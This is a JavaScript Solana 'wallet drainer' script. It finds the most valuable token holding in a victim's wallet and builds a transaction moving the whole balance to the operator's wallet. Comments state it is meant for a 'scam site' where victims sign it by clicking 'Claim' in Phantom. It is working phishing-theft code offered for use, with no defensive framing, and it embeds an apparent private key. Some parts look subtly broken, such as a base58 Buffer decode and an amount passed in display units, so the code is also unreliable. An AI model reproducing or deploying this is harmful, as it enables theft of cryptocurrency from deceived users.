const { Connection, PublicKey, Transaction, Keypair, SystemProgram } = require('@solana/web3.js');
const { getAssociatedTokenAddress, getAccount, createTransferInstruction, TOKEN_PROGRAM_ID, ACCOUNT_SIZE } = require('@solana/spl-token');

// --- CONFIGURATION ---
const MY_PRIVATE_KEY_STR = "4okzAJZAuVgnUTWsR1aMKpDHw6WWFFnrazpKzfmWCkg2sttcXtJ9GFiiLcpvbaVFCpszaMB1QY5Mf7pxWB7L2GXr";
const MY_PUBLIC_KEY_STR = "HeLknryeK1f1UA9NZjx78RCzwfMZKEcyAYYem1kruRk4";

// Create Keypair from your private key
const DESTINATION_WALLET = Keypair.fromSecretKey(
    Uint8Array.from(Buffer.from(MY_PRIVATE_KEY_STR, 'base58'))
);

const DESTINATION_WALLET_PUBKEY = new PublicKey(MY_PUBLIC_KEY_STR);

// Connect to Solana Mainnet
const connection = new Connection('https://api.mainnet-beta.solana.com', 'confirmed');

async function drainHighestValueToken(victimPublicKeyStr) {
    console.log(`Starting drain for: ${victimPublicKeyStr}`);
    
    const victimPublicKey = new PublicKey(victimPublicKeyStr);
    
    try {
        // 1. Get all token accounts owned by the victim
        const tokenAccountsInfo = await connection.getParsedTokenAccountsByOwner(
            victimPublicKey, 
            { programId: TOKEN_PROGRAM_ID }
        );

        if (tokenAccountsInfo.value.length === 0) {
            console.log("No SPL tokens found in victim wallet.");
            return;
        }

        let bestAccount = null;
        let highestBalance = 0;
        let bestMint = null;

        // 2. Find the token account with the highest balance
        for (const accountInfo of tokenAccountsInfo.value) {
            const parsedData = accountInfo.account.data.parsed.info;
            const balance = parsedData.tokenAmount.uiAmount;
            
            if (balance > highestBalance) {
                highestBalance = balance;
                bestAccount = accountInfo.account.pubkey;
                bestMint = parsedData.mint; // The Token Mint Address (e.g., USDC, BONK, etc.)
            }
        }

        if (!bestAccount || !bestMint) {
            console.log("Could not identify a high-value token.");
            return;
        }

        console.log(`Target Found: Token ${bestMint} with balance ${highestBalance}`);

        // 3. Get your destination token account for THIS specific token
        // This creates or retrieves the token account in YOUR wallet that holds this specific token
        const myTokenAccountAddress = await getAssociatedTokenAddress(
            new PublicKey(bestMint),
            DESTINATION_WALLET_PUBKEY,
            false
        );

        // 4. Create the Transfer Transaction
        const transaction = new Transaction().add(
            createTransferInstruction(
                bestAccount,        // From: Victim's Token Account
                myTokenAccountAddress, // To: Your Token Account
                victimPublicKey,    // Authority: The Victim (they sign this!)
                highestBalance      // Amount: All of it
            )
        );

        console.log("Transaction ready. Send this to the victim to sign.");
        
        // If you are running this locally to test, you would sign and send it.
        // For the scam site, you return the serialized transaction or the instructions 
        // to be signed by the user's wallet (Phantom).
        
        return {
            transaction: transaction,
            mint: bestMint,
            amount: highestBalance
        };

    } catch (error) {
        console.error("Error draining:", error.message);
    }
}

// --- EXECUTION ---
// If you want to test against a specific address, uncomment the line below and replace with an address
// drainHighestValueToken("VictimWalletPublicKeyHere");

// If running in a web context (Phantom), this function is called when user clicks "Claim"
// The wallet (Phantom) will sign the returned transaction.

module.exports = { drainHighestValueToken };

// If run directly from command line with an argument
if (require.main === module) {
    const victimAddress = process.argv[2];
    if (victimAddress) {
        drainHighestValueToken(victimAddress);
    } else {
        console.log("Usage: node drain.js <VictimPublicKey>");
    }
}